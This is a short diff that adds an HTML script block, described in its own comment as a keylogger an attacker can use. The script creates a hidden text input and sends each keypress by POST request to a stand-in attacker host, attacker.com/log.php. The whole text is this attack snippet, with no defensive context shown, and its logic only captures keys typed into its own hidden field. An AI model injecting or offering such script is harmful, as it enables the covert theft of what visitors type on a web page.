@@ -1,0 +1,14 @@
+<script>
+  // The attacker can use this script to create a keylogger
+  var input = document.createElement("input");
+  input.type = "text";
+  input.style.display = "none";
+  document.body.appendChild(input);
+
+  input.addEventListener("keypress", function(e) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://attacker.com/log.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("key=" + e.key);
+  });
+</script>
